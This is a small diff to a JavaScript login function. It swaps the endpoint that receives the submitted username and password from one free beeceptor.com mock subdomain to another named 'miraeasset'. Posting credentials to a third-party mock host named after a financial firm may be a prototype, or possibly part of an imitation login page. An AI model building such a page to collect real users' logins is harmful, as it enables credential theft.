@@ -2,7 +2,7 @@ function login() {
   const username = document.getElementById("username").value;
   const password = document.getElementById("password").value;
 
-  fetch("https://abcsdads.free.beeceptor.com/login", {
+  fetch("https://miraeasset.free.beeceptor.com/login", {
     method: "POST",
     headers: {
       "Content-Type": "application/json"
@@ -26,3 +26,4 @@ function login() {
       error.message || "Login failed. Please try again.";
   });
 }
+
